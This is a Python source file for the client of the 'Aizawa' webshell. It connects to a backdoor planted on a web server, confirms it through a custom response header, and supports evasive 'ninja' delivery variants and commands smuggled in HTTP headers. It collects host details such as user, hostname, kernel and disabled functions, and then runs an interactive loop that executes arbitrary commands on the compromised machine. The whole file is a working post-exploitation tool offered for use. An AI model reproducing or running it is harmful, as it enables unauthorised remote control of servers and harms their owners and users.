#!/usr/bin/env python
######################################################
##                                                  ##
##                  A I Z A W A                     ##
##                                                  ##
## Simple command Line webshell by @elliottophellia ##
##                                                  ##
######################################################

import re
import sys
import httpx
import asyncio
import validators
from modules.http import GetHeaders
from modules.executor import Executor
from modules.utilities import Banner,YELLOW,BLUE,RED,CLEAR,BOLD,PURPLE,GREEN,CYAN

async def main():
    async with httpx.AsyncClient(verify=False, http2=True, timeout=None) as client:
        url = sys.argv[1] if len(sys.argv) > 1 else input("Webshell URL: ")
        if not validators.url(url):
            sys.exit(
                print(f"{BOLD}{YELLOW}WARNING!{CLEAR}\n{RED}ERROR{CLEAR}: Invalid URL format\nThis does not appear to be a valid URL/IP address\nPlease check the input and try again\n")
            )

        regex = re.compile(r"^.*\.[a-zA-Z]+", re.MULTILINE)
        remove_char = regex.findall(url)
        url = remove_char[0]

        await Executor.execute(client, url, "", "ping")

        headers = await GetHeaders.get_headers(client, url)
        if headers is None or "Aizawa-Type" not in headers:
            sys.exit(
                print(f"{BOLD}{YELLOW}WARNING!{CLEAR}\n{RED}ERROR{CLEAR}: This not appear to be a valid Aizawa Webshell\nPlease check the server configuration and try again\n")
            )

        type = headers["Aizawa-Type"]

        expected_types = [
            "http_accept_language_get",
            "http_user_agent_get",
            "http_accept_language_post",
            "http_user_agent_post",
            "http_aizawa_ninja_eval",
            "http_aizawa_ninja_concat",
            "http_aizawa_ninja_debug",
            "http_aizawa_ninja_gc",
            "http_aizawa_ninja_json",
            "http_aizawa_ninja_filter",
        ]

        if type not in expected_types:
            sys.exit(
                print(f"{BOLD}{YELLOW}WARNING!{CLEAR}\n{RED}ERROR{CLEAR}: This not appear to be a valid Aizawa Webshell\nPlease check the server configuration and try again\n")
            )

        user = await Executor.execute(client, url, "whoami", type)
        host = await Executor.execute(client, url, "hostname", type)
        pwd = await Executor.execute(client, url, "pwd", type)

        user = (
            "aizawaema"
            if not user or user == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", user)
        )
        host = (
            "virtualesport"
            if not host or host == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", host)
        )
        pwd = (
            "~/unknown/path"
            if not pwd or pwd == "\033[31mERROR\033[0m"
            else re.sub(r"\s+", "", pwd)
        )

        if type in [
            "http_aizawa_ninja_concat",
            "http_aizawa_ninja_debug",
            "http_aizawa_ninja_gc",
            "http_aizawa_ninja_json",
            "http_aizawa_ninja_filter",
            "http_aizawa_ninja_eval",
        ]:
            print(f"{BOLD}{GREEN}Successfully connected to Aizawa Webshell Ninja Edition!{CLEAR}")
        else:
            print(f"{BOLD}{GREEN}Successfully connected to Aizawa Webshell!{CLEAR}\n")

            info_commands = {
                "Kernel": "unamea",
                "Server": "server",
                "Safe Mode": "safe_mode",
                "Server IP": "server_ip",
                "Client IP": "client_ip",
                "Disable Function": "disable_functions",
            }

            if type in ["http_accept_language_post", "http_user_agent_post"]:
                method = "post"
            elif type in ["http_accept_language_get", "http_user_agent_get"]:
                method = "get"

            max_label_width = max(len(label) for label in info_commands.keys())

            for info, command in info_commands.items():
                if method == "get":
                    result = await Executor.execute(client, url, f"?{command}", method)
                elif method == "post":
                    result = await Executor.execute(client, url, f"{command}", method)
                formatted_info = f"{info.ljust(max_label_width)} : {result}"
                print(f"{BOLD}{formatted_info}{CLEAR}")

        while True:
            cmd = input(f"\n{BOLD}{YELLOW}{user}{CLEAR}@{BOLD}{BLUE}{host}{CLEAR} {PURPLE}{pwd}{CLEAR} % ")
            if cmd == "exit" or cmd == "quit" or cmd == "\x03":
                sys.exit(print(f"{BOLD}{RED}Exiting...{CLEAR}"))
            if not cmd:
                continue

            print(f"\n{CYAN}{await Executor.execute(client, url, cmd, type)}{CLEAR}")


if __name__ == "__main__":
    Banner()

    try:
        asyncio.run(main())
    except Exception as e:
        print(
            f"An error of type {type(e).__name__} occurred. Please check the server's SSL/TLS configuration and your network connection."
        )
    except KeyboardInterrupt:
        print(f"\n{BOLD}{RED}Ctrl + C detected. Exiting...{CLEAR}")
